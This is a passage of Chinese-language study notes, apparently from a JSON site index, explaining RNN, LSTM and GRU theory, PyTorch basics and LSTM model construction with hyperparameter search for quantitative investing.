基于多层神经网络的机器学习方法\n特点: 自动学习特征表达\n优势: 在非结构化数据（图像、语音、文本）上表现优异\n\n2. 神经元模型\n输入层 → 加权求和 → 激活函数 → 输出\n\n数学表达式:\ny = f(Σ(w_i * x_i) + b)\n\n3. 常用激活函数\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n函数公式输出范围特点Sigmoid1/(1+e^(-x))(0, 1)输出概率，梯度消失Tanh(e^x-e^(-x))/(e^x+e^(-x))(-1, 1)零中心，梯度消失ReLUmax(0, x)[0, +∞)缓解梯度消失，计算快Leaky ReLUmax(αx, x), α&lt;&lt;1(-∞, +∞)解决ReLU死亡问题\n深度学习 vs 传统机器学习\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n维度传统机器学习深度学习特征工程手工设计自动学习数据需求中等大量训练时间短长可解释性较好较差\n量化投资中的应用场景\n\n时序预测: 股价、收益率预测\n特征学习: 自动提取有效因子\n模式识别: 市场状态识别\n风险预测: 违约概率、波动率预测\n\n\n序列数据与RNN\n序列数据特征\n1. 定义\n具有时间或顺序依赖的数据\n2. 特点\n\n顺序重要: 数据点的顺序有意义\n长度可变: 不同序列长度不同\n上下文依赖: 当前值依赖历史\n模式重复: 存在周期性模式\n\n3. 常见类型\n\n时间序列: 股价、天气、销量\n文本: 句子、文章\n语音: 音频波形\n视频: 帧序列\n\nRNN（循环神经网络）\n1. 核心思想\n\n共享参数: 同一神经网络处理每个时间步\n隐藏状态: 将历史信息传递到下一个时间步\n\n2. RNN架构\n时间步 t:\n  输入 x_t ──┐\n              ├── 加权求和 → 激活 → 隐藏状态 h_t\n  上一步 h_{t-1} ──┘\n              ↓\n          输出 y_t\n\n3. 数学公式\n隐藏状态更新:\nh_t = f(W_h * h_{t-1} + W_x * x_t + b)\n\n输出计算:\ny_t = g(W_y * h_t + c)\n\n变量说明:\n\nh_t: 时间t的隐藏状态（包含历史信息）\nx_t: 时间t的输入\nW_h: 隐藏状态权重矩阵\nW_x: 输入权重矩阵\nW_y: 输出权重矩阵\nb, c: 偏置项\nf, g: 激活函数（通常为tanh）\n\n4. RNN计算示例\n# 参数\nW_h = 0.5\nW_x = 0.3\nb = 0.1\n \n# 输入序列\ninputs = [0.1, 0.2, 0.3, 0.4]\nh_prev = 0.0  # 初始隐藏状态\n \n# 时间步计算\nfor t, x_t in enumerate(inputs, 1):\n    h_t = tanh(W_h * h_prev + W_x * x_t + b)\n    # h_t 包含了历史信息 (x_1, x_2, ..., x_t)\n    h_prev = h_t\nRNN的局限性\n梯度消失问题\n原因分析:\n链式法则:\n∂L/∂h_1 = ∂L/∂h_T * ∂h_T/∂h_{T-1} * ... * ∂h_2/∂h_1\n\n如果 |∂h_t/∂h_{t-1}| &lt; 1，乘积会快速趋近于0\n梯度消失示例:\n假设 |∂h_t/∂h_{t-1}| = 0.9:\n\n时间步 10: 0.9^10 = 0.35\n时间步 50: 0.9^50 = 0.005\n时间步 100: 0.9^100 = 0.00003\n\n影响:\n\n早期信息的梯度接近0\n无法学习长期依赖\n只能记住短期信息（约10-20步）\n\n解决方案\n\n使用LSTM（推荐）\n使用GRU\n梯度裁剪（解决梯度爆炸）\n\n\nLSTM原理详解\nLSTM的创新\n三大核心创新\n1. 细胞状态（Cell State, C_t）\n\n信息高速公路\n可以长期保持信息\n通过门控制信息流动\n\n2. 遗忘门（Forget Gate, f_t）\n\n决定丢弃什么信息\n输出0-1的值（sigmoid）\n0 = 完全遗忘，1 = 完全保留\n\n3. 输入门（Input Gate, i_t）\n\n决定添加什么信息\n控制新信息的流入\n选择性地更新细胞状态\n\n4. 输出门（Output Gate, o_t）\n\n决定输出什么信息\n基于细胞状态和隐藏状态\n生成最终的输出\n\nLSTM单元结构\n完整计算流程\nStep 1: 遗忘门\nf_t = σ(W_f * [h_{t-1}, x_t] + b_f)\n\n\n决定从细胞状态中丢弃什么信息\nσ: sigmoid函数（输出0-1）\n\nStep 2: 输入门\ni_t = σ(W_i * [h_{t-1}, x_t] + b_i)\nC̃_t = tanh(W_C * [h_{t-1}, x_t] + b_C)\n\n\ni_t：决定更新哪些值\nC̃_t：候选细胞状态\n\nStep 3: 细胞状态更新\nC_t = f_t * C_{t-1} + i_t * C̃_t\n\n\nf_t * C_{t-1}：遗忘部分信息\ni_t * C̃_t：添加部分新信息\n\nStep 4: 输出门\no_t = σ(W_o * [h_{t-1}, x_t] + b_o)\n\n\n决定输出什么信息\n\nStep 5: 隐藏状态更新\nh_t = o_t * tanh(C_t)\n\nLSTM门的作用示例\n股票价格预测场景\n场景1: 市场突然暴跌\n\n遗忘门：保留（记住暴跌事件）\n输入门：添加（记录恐慌情绪）\n输出门：输出（影响短期预测）\n\n场景2: 长期牛市趋势\n\n遗忘门：保留（长期趋势很重要）\n输入门：添加（持续更新）\n输出门：输出（影响预测）\n\n场景3: 短期噪音\n\n遗忘门：遗忘（忽略短期波动）\n输入门：不添加（不记录噪音）\n输出门：输出（基于长期信息）\n\nLSTM vs RNN vs GRU\n架构对比\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n特性RNNLSTMGRU长期依赖差优秀良好参数数量少多中训练速度快中快计算复杂度低高中门数量032细胞状态无有无记忆能力短期长中长量化使用很少常用常用\nGRU简介\nGRU（Gated Recurrent Unit）是LSTM的简化版本:\nGRU计算:\nz_t = σ(W_z * [h_{t-1}, x_t])  # 更新门\nr_t = σ(W_r * [h_{t-1}, x_t])  # 重置门\nh̃_t = tanh(W * [r_t * h_{t-1}, x_t])\nh_t = (1 - z_t) * h_{t-1} + z_t * h̃_t\n\nGRU特点:\n\n只有2个门（更新门、重置门）\n参数更少，训练更快\n性能与LSTM相近\n\n选择建议\nRNN:\n\n简单短期序列\n快速原型\n很少在量化中使用\n\nLSTM:\n\n长期依赖很重要\n计算资源充足\n量化投资常用\n\nGRU:\n\n平衡性能和速度\n参数较少\n也能用于量化\n\nLSTM的优势\n1. 解决梯度消失\n\n细胞状态提供梯度通路\n门机制控制梯度流动\n能够学习长期依赖\n\n2. 灵活的信息控制\n\n遗忘门：控制信息遗忘\n输入门：控制信息添加\n输出门：控制信息输出\n\n3. 应用广泛\n\n时间序列预测\n自然语言处理\n语音识别\n视频分析\n\n\n核心知识点总结\n深度学习基础\n\n✅ 神经元模型和激活函数\n✅ 多层感知机（MLP）\n✅ 深度学习 vs 传统机器学习\n✅ 在量化投资中的应用\n\nRNN原理\n\n✅ 序列数据特征\n✅ RNN架构和数学公式\n✅ 梯度消失问题\n✅ RNN的局限性\n\nLSTM原理\n\n✅ LSTM的三大创新\n✅ 细胞状态和门机制\n✅ LSTM计算流程\n✅ LSTM vs RNN vs GRU对比\n✅ 选择建议\n\n\n下一步\n继续学习: PyTorch框架系列"},"quant/qlib/week5/02_PyTorch框架系列/index":{"slug":"quant/qlib/week5/02_PyTorch框架系列/index","filePath":"quant/qlib/week5/02_PyTorch框架系列/index.md","title":"index","links":["03_LSTM模型构建系列/"],"tags":[],"content":"PyTorch框架系列 - Tensor与模型构建\n📚 系列概述\n本系列文档涵盖PyTorch的核心概念、Tensor操作、自动微分、模型定义和常用层。\n\n📖 文档列表\n\nPyTorch简介\nTensor基础\nAutograd自动微分\nnn.Module模型定义\n常用层\n\n\nPyTorch简介\n什么是PyTorch\n\n基于Python的深度学习框架\nFacebook（Meta）开发\n学术研究首选框架\n\n核心特点\n1. 动态计算图\n\n运行时构建计算图\n灵活性高\n适合研究\n\n2. GPU加速\n\n自动利用GPU\n显著提升训练速度\n支持CUDA\n\n3. 自动微分\n\n自动计算梯度\n简化反向传播\n支持复杂计算图\n\n4. 丰富的API\n\n预定义层和模型\n优化器和损失函数\n数据处理工具\n\n为什么量化投资用PyTorch\n1. 灵活性强\n\n可以自定义复杂的模型结构\n容易实现研究想法\n\n2. 社区活跃\n\n大量教程和示例\n问题容易解决\n\n3. 易于部署\n\n支持导出为多种格式\n生产环境友好\n\n\nTensor基础\nTensor定义\n\nPyTorch的核心数据结构\n类似于NumPy数组\n可以运行在GPU上\n\n创建Tensor\nimport torch\n \n# 从Python列表创建\nt1 = torch.tensor([1, 2, 3, 4])\n \n# 从NumPy创建\nimport numpy as np\nnp_array = np.array([[1, 2], [3, 4]])\nt2 = torch.from_numpy(np_array)\n \n# 创建特殊Tensor\nzeros = torch.zeros(2, 3)        # 全零\nones = torch.ones(2, 3)          # 全一\nrandom = torch.randn(2, 3)       # 标准正态分布\n \n# 创建序列\narange = torch.arange(0, 10)      # 0-9\nlinspace = torch.linspace(0, 10, 5)  # 0到10，5个点\nTensor操作\n基本运算\na = torch.tensor([1, 2, 3])\nb = torch.tensor([4, 5, 6])\n \n# 加法、减法、乘法、除法\nc = a + b\nd = a - b\ne = a * b\nf = a / b\n \n# 点积\ndot = torch.dot(a, b)\n \n# 矩阵乘法\nmat_a = torch.randn(2, 3)\nmat_b = torch.randn(3, 4)\nmat_c = torch.mm(mat_a, mat_b)  # 或 mat_a @ mat_b\n统计运算\nx = torch.randn(10)\n \n# 均值、标准差、方差\nmean = x.mean()\nstd = x.std()\nvar = x.var()\n \n# 最大值、最小值\nmax_val = x.max()\nmin_val = x.min()\n \n# 求和\nsum_val = x.sum()\n形状操作\nx = torch.arange(12)\n \n# reshape\nx_reshaped = x.view(3, 4)  # 或 x.reshape(3, 4)\n \n# 转置\nx_transposed = x_reshaped.t()\n \n# squeeze: 去除维度为1的\nx_squeezed = torch.randn(1, 10, 1).squeeze()\n \n# unsqueeze: 增加维度\nx_unsqueezed = x.unsqueeze(0)\nTensor vs NumPy\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n特性NumPyTensorGPU支持❌✅自动微分❌✅性能CPUCPU/GPUAPI类似类似互操作易易\n互操作\n# NumPy → Tensor\nnp_array = np.array([1, 2, 3])\ntensor = torch.from_numpy(np_array)\n \n# Tensor → NumPy\narray = tensor.numpy()\n\nAutograd自动微分\nAutograd概述\n\nPyTorch的自动微分引擎\n自动计算梯度\n支持复杂的计算图\n\n关键概念\n1. requires_grad\n\n标记需要计算梯度的Tensor\n默认为False\n通常是模型参数\n\n2. backward()\n\n反向传播，计算梯度\n从loss开始\n沿计算图传播梯度\n\n3. grad\n\n存储梯度值\n在backward()后填充\n用于参数更新\n\n简单示例\n单变量梯度\nimport torch\n \n# 创建需要梯度的Tensor\nx = torch.tensor(2.0, requires_grad=True)\n \n# 定义函数: y = x^2 + 3x + 1\ny = x**2 + 3 * x + 1\n \n# 反向传播\ny.backward()\n \n# 梯度: dy/dx = 2x + 3 = 2*2 + 3 = 7\nprint(x.grad)  # tensor(7.)\n多变量梯度\nx1 = torch.tensor(2.0, requires_grad=True)\nx2 = torch.tensor(3.0, requires_grad=True)\n \n# y = x1^2 + x2^2\ny = x1**2 + x2**2\n \ny.backward()\n \nprint(f&quot;∂y/∂x1 = {x1.grad}&quot;)  # 4.0\nprint(f&quot;∂y/∂x2 = {x2.grad}&quot;)  # 6.0\n训练循环中的梯度\n# 模型参数\nw = torch.tensor([1.0], requires_grad=True)\nb = torch.tensor([0.0], requires_grad=True)\n \n# 输入和目标\nx = torch.tensor([2.0])\ny_true = torch.tensor([5.0])\n \n# 前向传播\ny_pred = w * x + b\n \n# 计算损失\nloss = (y_pred - y_true) ** 2\n \n# 反向传播\nloss.backward()\n \nprint(f&quot;∂loss/∂w = {w.grad}&quot;)  # -4.0\nprint(f&quot;∂loss/∂b = {b.grad}&quot;)  # -2.0\n \n# 参数更新\nlearning_rate = 0.1\nwith torch.no_grad():\n    w -= learning_rate * w.grad\n    b -= learning_rate * b.grad\n \nprint(f&quot;w = {w.data}&quot;)  # 1.4\nprint(f&quot;b = {b.data}&quot;)  # 0.2\n \n# 重要: 更新后清零梯度\nw.grad.zero_()\nb.grad.zero_()\n梯度计算注意事项\n1. 清零梯度\n# 每次backward()前需要清零梯度\noptimizer.zero_grad()\n# 或手动清零\nmodel.zero_grad()\n2. 禁用梯度计算\n# 评估时禁用梯度\nwith torch.no_grad():\n    predictions = model(X)\n \n# 推理模式\nmodel.eval()\n3. 梯度裁剪\n# 防止梯度爆炸\ntorch.nn.utils.clip_grad_norm_(model.parameters(), max_norm=1.0)\n\nnn.Module模型定义\nnn.Module概述\n\nPyTorch中所有神经网络模型的基类\n提供模型管理和自动微分功能\n必须实现__init__和forward方法\n\n模型定义模板\nimport torch.nn as nn\n \nclass MyModel(nn.Module):\n    def __init__(self):\n        super().__init__()\n        # 定义层\n \n    def forward(self, x):\n        # 前向传播\n        return output\n线性模型示例\nclass SimpleLinearModel(nn.Module):\n    def __init__(self, input_size, hidden_size, output_size):\n        super().__init__()\n        # 定义层\n        self.fc1 = nn.Linear(input_size, hidden_size)\n        self.fc2 = nn.Linear(hidden_size, output_size)\n        self.relu = nn.ReLU()\n \n    def forward(self, x):\n        # 前向传播\n        x = self.fc1(x)\n        x = self.relu(x)\n        x = self.fc2(x)\n        return x\n \n# 创建模型\nmodel = SimpleLinearModel(input_size=10, hidden_size=20, output_size=1)\n \n# 查看模型\nprint(model)\n \n# 参数数量\ntotal_params = sum(p.numel() for p in model.parameters())\nprint(f&quot;总参数: {total_params}&quot;)\n查看模型参数\n# 遍历参数\nfor name, param in model.named_parameters():\n    print(f&quot;{name}: {param.shape}&quot;)\n \n# 访问特定层\nfc1_weights = model.fc1.weight\nfc1_bias = model.fc1.bias\n \nprint(fc1_weights.shape)\nprint(fc1_bias.shape)\n模型方法\n# 训练模式\nmodel.train()\n \n# 评估模式\nmodel.eval()\n \n# 移动到GPU\nmodel.to(&#039;cuda&#039;)\n \n# 保存模型参数\ntorch.save(model.state_dict(), &#039;model.pth&#039;)\n \n# 加载模型参数\nmodel.load_state_dict(torch.load(&#039;model.pth&#039;))\n\n常用层\n全连接层（nn.Linear）\n公式\ny = xW^T + b\n\n示例\n# 输入维度10，输出维度5\nlinear = nn.Linear(10, 5)\n \n# 输入 (batch_size=3, input_size=10)\nx = torch.randn(3, 10)\n \n# 输出 (batch_size=3, output_size=5)\ny = linear(x)\n \nprint(y.shape)  # torch.Size([3, 5])\nLSTM层（nn.LSTM）\n参数说明\n\ninput_size: 输入特征维度\nhidden_size: 隐藏状态维度\nnum_layers: LSTM层数\nbatch_first: batch是否在第一维\nbidirectional: 是否双向\ndropout: Dropout比例\n\n输入格式\n\nbatch_first=False: (seq_len, batch, input_size)\nbatch_first=True: (batch, seq_len, input_size)\n\n输出格式\n\noutput: (batch, seq_len, hidden_size)\nh_n: (num_layers, batch, hidden_size)\nc_n: (num_layers, batch, hidden_size)\n\n示例\n# 创建LSTM\nlstm = nn.LSTM(\n    input_size=10,\n    hidden_size=20,\n    num_layers=2,\n    batch_first=True,\n    dropout=0.2\n)\n \n# 输入 (batch=5, seq_len=8, input_size=10)\nx = torch.randn(5, 8, 10)\n \n# 前向传播\noutput, (h_n, c_n) = lstm(x)\n \nprint(f&quot;output: {output.shape}&quot;)  # (5, 8, 20)\nprint(f&quot;h_n: {h_n.shape}&quot;)        # (2, 5, 20)\nprint(f&quot;c_n: {c_n.shape}&quot;)        # (2, 5, 20)\n激活函数\nimport torch.nn as nn\n \nx = torch.randn(5)\n \n# ReLU\nrelu = nn.ReLU()\ny_relu = relu(x)  # max(0, x)\n \n# Sigmoid\nsigmoid = nn.Sigmoid()\ny_sigmoid = sigmoid(x)  # 1 / (1 + exp(-x))\n \n# Tanh\ntanh = nn.Tanh()\ny_tanh = tanh(x)  # (exp(x) - exp(-x)) / (exp(x) + exp(-x))\n \n# Leaky ReLU\nleaky_relu = nn.LeakyReLU(0.01)\ny_leaky = leaky_relu(x)  # max(0.01x, x)\nDropout\n作用\n\n防止过拟合\n随机丢弃部分神经元\n\n示例\ndropout = nn.Dropout(p=0.5)  # 50%的神经元被置零\n \nx = torch.ones(10)\ny = dropout(x)\n \nprint(x)  # tensor([1., 1., 1., 1., 1., 1., 1., 1., 1., 1.])\nprint(y)  # tensor([2., 0., 2., 0., 2., 0., 0., 2., 0., 2.])  # 约50%为0\nBatchNorm\n作用\n\n加速训练\n提高稳定性\n\n1D BatchNorm\nbatchnorm1d = nn.BatchNorm1d(num_features=10)\n \n# 输入 (batch=5, features=10)\nx = torch.randn(5, 10)\ny = batchnorm1d(x)\n2D BatchNorm（用于CNN）\nbatchnorm2d = nn.BatchNorm2d(num_features=10)\n \n# 输入 (batch=5, channels=10, height=20, width=20)\nx = torch.randn(5, 10, 20, 20)\ny = batchnorm2d(x)\nEmbedding层\n作用\n\n将离散值映射为稠密向量\n用于自然语言处理\n\n示例\n# 词汇表大小10000，嵌入维度100\nembedding = nn.Embedding(num_embeddings=10000, embedding_dim=100)\n \n# 输入 (batch=5, seq_len=10)\nx = torch.randint(0, 10000, (5, 10))\n \n# 输出 (batch=5, seq_len=10, embedding_dim=100)\ny = embedding(x)\n \nprint(y.shape)  # torch.Size([5, 10, 100])\n\n核心知识点总结\nPyTorch简介\n\n✅ 动态计算图\n✅ GPU加速\n✅ 自动微分\n✅ 丰富的API\n\nTensor基础\n\n✅ Tensor创建\n✅ Tensor操作\n✅ Tensor vs NumPy\n✅ 互操作\n\nAutograd\n\n✅ requires_grad\n✅ backward()\n✅ 梯度计算\n✅ 梯度清零和裁剪\n\nnn.Module\n\n✅ 模型定义模板\n✅ forward方法\n✅ 模型参数管理\n✅ 训练/评估模式\n\n常用层\n\n✅ nn.Linear\n✅ nn.LSTM\n✅ 激活函数\n✅ Dropout\n✅ BatchNorm\n\n\n下一步\n继续学习: LSTM模型构建系列"},"quant/qlib/week5/03_LSTM模型构建系列/index":{"slug":"quant/qlib/week5/03_LSTM模型构建系列/index","filePath":"quant/qlib/week5/03_LSTM模型构建系列/index.md","title":"index","links":["04_时序数据处理系列/"],"tags":[],"content":"LSTM模型构建系列 - 架构与实现\n📚 系列概述\n本系列文档涵盖LSTM模型的各种架构、模型定义、超参数配置和变体。\n\n📖 文档列表\n\nLSTM模型架构\n单层LSTM\n多层LSTM\n双向LSTM\nLSTM变体\n超参数选择\n\n\nLSTM模型架构\n完整LSTM模型结构\n输入 (batch, seq_len, input_size)\n    ↓\nLSTM层 (多层)\n    ↓\nDropout层 (防止过拟合)\n    ↓\n全连接层\n    ↓\n输出 (batch, output_size)\n\n参数说明\n输入参数\n\ninput_size: 特征维度\nhidden_size: LSTM隐藏单元数\nnum_layers: LSTM层数\ndropout: Dropout比例\noutput_size: 输出维度\n\n模型参数\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n参数说明推荐值影响input_size输入特征维度由数据决定不可改变hidden_size隐藏单元数32-128模型容量num_layersLSTM层数1-3模型深度dropoutDropout比例0.1-0.3防止过拟合batch_firstbatch是否在前True数据格式\n\n单层LSTM\n模型定义\nimport torch.nn as nn\n \nclass SingleLSTM(nn.Module):\n    def __init__(self, input_size, hidden_size, output_size, dropout=0.2):\n        super().__init__()\n        self.hidden_size = hidden_size\n \n        # LSTM层\n        self.lstm = nn.LSTM(\n            input_size=input_size,\n            hidden_size=hidden_size,\n            batch_first=True\n        )\n \n        # Dropout层\n        self.dropout = nn.Dropout(dropout)\n \n        # 全连接层\n        self.fc = nn.Linear(hidden_size, output_size)\n \n    def forward(self, x):\n        &quot;&quot;&quot;\n        输入: (batch, seq_len, input_size)\n        输出: (batch, output_size)\n        &quot;&quot;&quot;\n        # 前向传播\n        lstm_out, _ = self.lstm(x)\n \n        # 取最后一个时间步的输出\n        last_output = lstm_out[:, -1, :]\n \n        # Dropout\n        last_output = self.dropout(last_output)\n \n        # 全连接层\n        output = self.fc(last_output)\n \n        return output\n使用示例\n# 创建模型\nmodel = SingleLSTM(\n    input_size=10,\n    hidden_size=64,\n    output_size=1,\n    dropout=0.2\n)\n \n# 输入数据\nx = torch.randn(32, 20, 10)  # (batch=32, seq_len=20, input_size=10)\n \n# 前向传播\noutput = model(x)\n \nprint(output.shape)  # torch.Size([32, 1])\n适用场景\n\n简单时序预测任务\n数据量有限\n快速原型开发\n\n\n多层LSTM\n模型定义\nclass MultiLSTM(nn.Module):\n    def __init__(self, input_size, hidden_size, num_layers, dropout, output_size):\n        super().__init__()\n        self.hidden_size = hidden_size\n        self.num_layers = num_layers\n \n        # 多层LSTM\n        self.lstm = nn.LSTM(\n            input_size=input_size,\n            hidden_size=hidden_size,\n            num_layers=num_layers,\n            batch_first=True,\n            dropout=dropout if num_layers &gt; 1 else 0\n        )\n \n        # Dropout\n        self.dropout = nn.Dropout(dropout)\n \n        # 全连接层\n        self.fc = nn.Linear(hidden_size, output_size)\n \n    def forward(self, x):\n        &quot;&quot;&quot;\n        输入: (batch, seq_len, input_size)\n        输出: (batch, output_size)\n        &quot;&quot;&quot;\n        lstm_out, _ = self.lstm(x)\n        last_output = lstm_out[:, -1, :]\n        last_output = self.dropout(last_output)\n        output = self.fc(last_output)\n        return output\n使用示例\n# 创建模型\nmodel = MultiLSTM(\n    input_size=10,\n    hidden_size=64,\n    num_layers=3,\n    dropout=0.2,\n    output_size=1\n)\n \n# 输入数据\nx = torch.randn(32, 20, 10)\n \n# 前向传播\noutput = model(x)\n \nprint(output.shape)  # torch.Size([32, 1])\n多层LSTM的特点\n优势:\n\n增强模型表达能力\n学习更复杂的特征\n提升模型性能\n\n劣势:\n\n参数量增加\n训练时间增加\n过拟合风险增加\n\n适用场景\n\n复杂时序模式\n数据量充足\n需要更强的表达能力\n\n\n双向LSTM（Bi-LSTM）\n模型定义\nclass BiLSTM(nn.Module):\n    def __init__(self, input_size, hidden_size, num_layers, dropout, output_size):\n        super().__init__()\n        self.hidden_size = hidden_size\n        self.num_layers = num_layers\n \n        # 双向LSTM\n        self.lstm = nn.LSTM(\n            input_size=input_size,\n            hidden_size=hidden_size,\n            num_layers=num_layers,\n            batch_first=True,\n            bidirectional=True,  # 双向\n            dropout=dropout if num_layers &gt; 1 else 0\n        )\n \n        # 双向输出维度是hidden_size * 2\n        self.dropout = nn.Dropout(dropout)\n        self.fc = nn.Linear(hidden_size * 2, output_size)\n \n    def forward(self, x):\n        &quot;&quot;&quot;\n        输入: (batch, seq_len, input_size)\n        输出: (batch, output_size)\n        &quot;&quot;&quot;\n        lstm_out, _ = self.lstm(x)\n        last_output = lstm_out[:, -1, :]\n        last_output = self.dropout(last_output)\n        output = self.fc(last_output)\n        return output\n使用示例\n# 创建模型\nmodel = BiLSTM(\n    input_size=10,\n    hidden_size=64,\n    num_layers=2,\n    dropout=0.2,\n    output_size=1\n)\n \n# 输入数据\nx = torch.randn(32, 20, 10)\n \n# 前向传播\noutput = model(x)\n \nprint(output.shape)  # torch.Size([32, 1])\n双向LSTM的特点\n优势:\n\n同时利用过去和未来信息\n适合需要上下文的任务\n性能通常更好\n\n劣势:\n\n参数量增加一倍\n不能用于实时预测（需要未来数据）\n训练时间增加\n\n适用场景\n\n文本分类、情感分析\n机器翻译\n需要上下文信息的任务\n❌ 不推荐: 实时股票预测\n\n\nLSTM变体\n1. 堆叠LSTM（Stacked LSTM）\n定义\n\n多层LSTM堆叠\n每层学习不同层次的抽象\n\n架构\n输入 → LSTM层1 → LSTM层2 → ... → LSTM层N → 输出\n\n实现\nclass StackedLSTM(nn.Module):\n    def __init__(self, input_size, hidden_size, num_layers, output_size):\n        super().__init__()\n \n        self.lstm = nn.LSTM(\n            input_size=input_size,\n            hidden_size=hidden_size,\n            num_layers=num_layers,\n            batch_first=True,\n            dropout=0.2\n        )\n \n        self.fc = nn.Linear(hidden_size, output_size)\n \n    def forward(self, x):\n        lstm_out, _ = self.lstm(x)\n        output = self.fc(lstm_out[:, -1, :])\n        return output\n2. 编码器-解码器LSTM\n定义\n\n编码器：将序列编码为固定长度向量\n解码器：从向量生成输出序列\n\n架构\n输入序列 → 编码器LSTM → 上下文向量 → 解码器LSTM → 输出序列\n\n实现\nclass EncoderDecoderLSTM(nn.Module):\n    def __init__(self, input_size, hidden_size, output_size):\n        super().__init__()\n \n        # 编码器\n        self.encoder = nn.LSTM(input_size, hidden_size, batch_first=True)\n \n        # 解码器\n        self.decoder = nn.LSTM(hidden_size, hidden_size, batch_first=True)\n \n        # 输出层\n        self.fc = nn.Linear(hidden_size, output_size)\n \n    def forward(self, x):\n        # 编码\n        _, (h_n, c_n) = self.encoder(x)\n \n        # 解码\n        decoder_input = h_n[-1].unsqueeze(1).repeat(1, x.size(1), 1)\n        decoder_output, _ = self.decoder(decoder_input, (h_n, c_n))\n \n        # 输出\n        output = self.fc(decoder_output)\n \n        return output\n3. 注意力LSTM（Attention LSTM）\n定义\n\n添加注意力机制\n动态关注重要时间步\n\n实现\nclass AttentionLSTM(nn.Module):\n    def __init__(self, input_size, hidden_size, output_size):\n        super().__init__()\n \n        self.lstm = nn.LSTM(input_size, hidden_size, batch_first=True)\n \n        # 注意力层\n        self.attention = nn.Linear(hidden_size, 1)\n \n        self.fc = nn.Linear(hidden_size, output_size)\n \n    def forward(self, x):\n        # LSTM输出\n        lstm_out, _ = self.lstm(x)\n \n        # 计算注意力权重\n        attention_weights = torch.softmax(self.attention(lstm_out), dim=1)\n \n        # 加权求和\n        context = torch.sum(attention_weights * lstm_out, dim=1)\n \n        # 输出\n        output = self.fc(context)\n \n        return output\n\n超参数选择\n关键超参数\n1. hidden_size（隐藏单元数）\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n任务规模hidden_size说明小规模32-64简单任务，数据量小中等规模64-128一般任务大规模128-256复杂任务，数据量大\n选择原则:\n\n从小开始，逐步增加\n监控过拟合\n考虑计算资源\n\n2. num_layers（LSTM层数）\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n模式num_layers说明简单1简单任务中等2-3一般任务复杂3-5复杂任务\n选择原则:\n\n不要过度堆叠\n2-3层通常足够\n超过5层收益递减\n\n3. dropout（Dropout比例）\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n场景dropout说明无过拟合0.0-0.1训练集表现好轻微过拟合0.1-0.3轻微过拟合严重过拟合0.3-0.5严重过拟合\n选择原则:\n\n从0.1开始\n根据验证集调整\n不要超过0.5\n\n4. learning_rate（学习率）\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n优化器learning_range说明Adam0.0001-0.001推荐默认值SGD0.01-0.1需要momentumRMSprop0.001-0.01RNN专用\n学习率调度:\n# 初始学习率\nlearning_rate = 0.001\n \n# 学习率衰减\nscheduler = torch.optim.lr_scheduler.StepLR(\n    optimizer,\n    step_size=10,  # 每10个epoch\n    gamma=0.1      # 学习率乘0.1\n)\n \n# 余弦退火\nscheduler = torch.optim.lr_scheduler.CosineAnnealingLR(\n    optimizer,\n    T_max=50  # 总epoch数\n)\n5. batch_size（批大小）\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n硬件batch_size说明CPU16-32内存有限单GPU32-128GPU内存多GPU64-256并行计算\n选择原则:\n\n2的幂次方（32, 64, 128）\n根据GPU内存调整\n越大越稳定，但越慢\n\n6. seq_len（序列长度）\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n预测目标seq_len说明短期5-10日内交易中期20-60几天到几周长期60-120几个月\n选择原则:\n\n基于业务逻辑\n通过实验确定\n考虑计算成本\n\n超参数搜索\n网格搜索\nfrom itertools import product\n \n# 参数网格\nparam_grid = {\n    &#039;hidden_size&#039;: [32, 64, 128],\n    &#039;num_layers&#039;: [1, 2, 3],\n    &#039;dropout&#039;: [0.1, 0.2, 0.3],\n    &#039;learning_rate&#039;: [0.0001, 0.001, 0.01],\n    &#039;batch_size&#039;: [16, 32, 64]\n}\n \n# 生成所有组合\nparam_combinations = list(product(\n    param_grid[&#039;hidden_size&#039;],\n    param_grid[&#039;num_layers&#039;],\n    param_grid[&#039;dropout&#039;],\n    param_grid[&#039;learning_rate&#039;],\n    param_grid[&#039;batch_size&#039;]\n))\n随机搜索\nimport random\n \n# 随机搜索n次\nn_trials = 20\n \nfor _ in range(n_trials):\n    # 随机选择参数\n    hidden_size = random.choice([32, 64, 128])\n    num_layers = random.choice([1, 2, 3])\n    dropout = random.uniform(0.1, 0.3)\n    learning_rate = random.choice([0.0001, 0.001, 0.01])\n    batch_size = random.choice([16, 32, 64])\n \n    # 训练和评估\n    # ...\n贝叶斯优化\nfrom skopt import gp_minimize\n \n# 定义搜索空间\nspace = [\n    (32, 256),           # hidden_size\n    (1, 4),              # num_layers\n    (0.1, 0.5),          # dropout\n    (0.0001, 0.01, &#039;log&#039;),  # learning_rate\n    (16, 128)            # batch_size\n]\n \n# 定义目标函数\ndef objective(params):\n    hidden_size, num_layers, dropout, learning_rate, batch_size = params\n \n    # 训练模型\n    model = MultiLSTM(\n        input_size=10,\n        hidden_size=hidden_size,\n        num_layers=int(num_layers),\n        dropout=dropout,\n        output_size=1\n    )\n \n    # 返回验证损失\n    return val_loss\n \n# 优化\nresult = gp_minimize(objective, space, n_calls=50)\n\n核心知识点总结\nLSTM模型架构\n\n✅ 完整LSTM结构\n✅ 参数说明\n✅ 数据流\n\n单层LSTM\n\n✅ 模型定义\n✅ 使用示例\n✅ 适用场景\n\n多层LSTM\n\n✅ 模型定义\n✅ 优劣势分析\n✅ 